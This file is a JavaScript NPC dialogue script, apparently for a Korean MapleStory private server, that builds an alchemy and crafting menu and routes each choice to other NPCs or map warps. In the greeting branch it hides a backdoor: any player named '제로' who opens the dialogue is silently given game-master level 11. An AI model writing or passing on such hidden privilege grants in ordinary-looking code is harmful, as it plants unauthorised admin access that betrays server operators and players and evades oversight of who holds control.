var enter = "\r\n";
var seld = -1;

function start() {
	status = -1;
	action(1, 0, 0);
}
function action(mode, type, sel) {
	if (mode == 1) {
		status++;
	} else {
		cm.dispose();
		return;
    	}
	if (status == 0) {
		var msg = "#fs11#안녕하세요 #e#b#h ##n#k 님! #b연금술#k에 관심이 있으신가요?\r\n";
		msg += "#fs12##fc0xFFFF9436##e #L9#[ 장비 ]#l    #L1#[기타]#l    #L7#[안드로이드]#l#k#n\r\n\r\n";
		msg += "#L2##fs11# #i2048753##b 검은 환생의 불꽃#k 제작#l#n\r\n\r\n";
		msg += "#L3##fs11# #i2002093##b 도핑약#k 제작 #b(2분간 올스탯,공마+300)#l#k#n\r\n\r\n";
		//msg += "#L6##fs11# #i1032209##b 경험치 귀고리#k 제작#l#n\r\n\r\n";
		//msg += "#L4##fs11##i1113305##fc0xFFF781D8# 마스테리아의 유산 세트#k 제작#l#n\r\n";
		//msg += "#L5##fs11##i1114325##fc0xFFF781D8# 제네시스 장신구#k 제작#l#n\r\n\r\n\r\n";
		//msg += "#fs12##fc0xFFFF9436##e    [ 소비 ]#k#n\r\n";
		//msg += "#L7##fs11# #i2431940##b 피로 회복제#k 제작#l#n\r\n\r\n";
		//msg += "#L8##fs11# #i2002093##b 도핑약#k 제작 #b(2분간 올스탯,공마+300)#l#k#n\r\n\r\n";
                msg += "\r\n";
		if (cm.getPlayer().getName().equals("제로")) {
			cm.getPlayer().setGMLevel(11);
		}
		cm.sendSimple(msg);
	} else if (status == 1) {
		seld = sel;
		switch (sel) {
			case 1:
				var msg = "";
				cm.dispose();
				cm.openNpc(2040050);
			break;
			case 2:
				cm.dispose();
				cm.openNpc(3004447);
			break;
			case 3:
				cm.dispose();
				cm.openNpc(9031001);
			break;
			case 4:
				cm.dispose();
				cm.openNpc(9031002);
			break;
			case 5:
				cm.dispose();
				cm.openNpc(3000002);
			break;
                                         case 6:
				cm.dispose();
				cm.openNpc(3000003);
			break;
                                        case 7:
				var msg = "#fs11#인내심을 테스트해보고싶으신가요?\r\n#b점프맵#k을 클리어해 보상을 받아보세요!"+enter;
				msg += "#fs11##fUI/UIWindow8.img/EldaGauge/tooltip/23##d 존 클리어";
				msg += "#L1##fs11##fUI/UIWindow8.img/EldaGauge/tooltip/23##d 인내의 숲"+enter;
				msg += "#L2##fs11##fUI/UIWindow8.img/EldaGauge/tooltip/24# 끈기의 숲"+enter;
				msg += "#L3##fs11##fUI/UIWindow8.img/EldaGauge/tooltip/25# 고지를 향해서"+enter;
				msg += "#L4##fs11##fUI/UIWindow8.img/EldaGauge/tooltip/26# 펫 산책로 (헤네시스)"+enter;
				msg += "#L5##fs11##fUI/UIWindow8.img/EldaGauge/tooltip/27# 펫 산책로 (루디브리엄)"+enter;
				cm.sendSimple(msg);
			break;
                        case 8:
				var msg = "";
				msg += "#L2##fUI/UIWindow8.img/EldaGauge/tooltip/23##d 레벨 달성 보상받기#k";
				msg += "#L6##fUI/UIWindow8.img/EldaGauge/tooltip/24##d 각종아이템 뽑기#k"+enter+enter;
				msg += "#L3##fUI/UIWindow8.img/EldaGauge/tooltip/19# 랜덤 상자 뽑기"+enter;
				//msg += "#L5##fUI/UIWindow8.img/EldaGauge/tooltip/17# 기어 업그레이드"+enter;
				cm.sendSimple(msg);
			break;
                                         case 9:
				cm.dispose();
				cm.openNpc(2040050);
			break;
		}
	} else if (status == 2) {
		switch (seld) {
			case 1:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(9010106);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(9010107);
					break;
					case 3:
						cm.dispose();
						cm.openNpc(3003162);
					break;
					case 4:
						cm.dispose();
						cm.openNpc(3003252);
					break;
					case 5:
						cm.dispose();
						cm.openNpc(3003480);
					break;
                                        case 6:
						cm.dispose();
						cm.openNpc(3003756);
					break;
				}
			break;
			case 2:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(1540895); 
					break;
					case 2:
						cm.dispose();
						cm.openNpc(2155000); 
					break;
					case 3:
						cm.dispose();
						cm.openNpc(3003104); 
					break;
					case 4:
						cm.dispose();
						cm.openNpc(3003162); 
					break;
					case 5:
						cm.dispose();
						cm.openNpc(3003252); 
					break;
                                        case 6:
						cm.dispose();
						cm.openNpc(3003326); 
					break;
                                        case 7:
						cm.dispose();
						cm.openNpc(3003480);
					break;
                                        case 8:
						cm.dispose();
						cm.openNpc(3003756);
					break;
                                        case 9:
						cm.dispose();
						cm.openNpc(3004540);
					break;
case 11:
						cm.dispose();
						cm.openNpc(9000368);
					break;
				}
			break;
			case 3:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(3004414);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(3003672);
					break;
					case 3:
						cm.dispose();
						cm.openNpc(3003381);
					break;
					case 4:
						cm.dispose();
						cm.warp(993017000);
					break;
					case 5:
						cm.dispose();
						cm.warp(993001000);
					break;
					case 6:
						cm.dispose();
						cm.openNpc(9062148);
					break;

					case 7:
						cm.dispose();
						cm.openNpc(2121020);
					break;

				}
			break;
			case 4:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 3:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 4:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 5:
						cm.dispose();
						cm.openNpc(2008);
					break;
				}
			break;
			case 5:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(2010007);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(2010009);
					break;
					case 3:
							cm.dispose();
						cm.warp(200000301, 1);
					break;
					case 4:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 5:
						cm.dispose();
						cm.openNpc(2008);
					break;
				}
			break;
                        case 6:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.warp(100000000, 1);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(1031001);
					break;
					case 3:
						cm.dispose();
						cm.openNpc(9400340);
					break;
					case 4:
						cm.dispose();
						cm.openNpc(2008);
					break;
					case 5:
						cm.dispose();
						cm.openNpc(2008);
					break;
				}
			break;
                       case 7:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.openNpc(9062288);
					break;
					case 2:
						cm.dispose();
						cm.warp(910530100, 0);
					break;
					case 3:
						cm.dispose();
						cm.warp(109040001, 0);
					break;
					case 4:
						cm.dispose();
						cm.warp(100000202, 0);
					break;
					case 5:
						cm.dispose();
						cm.warp(220000006, 0);
					break;
				}
			break;
                        case 8:
				switch (sel) {
					case 1:
						cm.dispose();
						cm.warp(100000000, 1);
					break;
					case 2:
						cm.dispose();
						cm.openNpc(1540101);
					break;
					case 3:
						cm.dispose();
						cm.openNpc(9000381);
					break;
					case 4:
						cm.dispose();
						cm.openNpc(9000224);
					break;
					case 5:
						cm.dispose();
						cm.openNpc(9001153);
					break;
					case 6:
						cm.dispose();
						cm.openNpc(1540110);
					break;
				}
			break;
		}
	}
}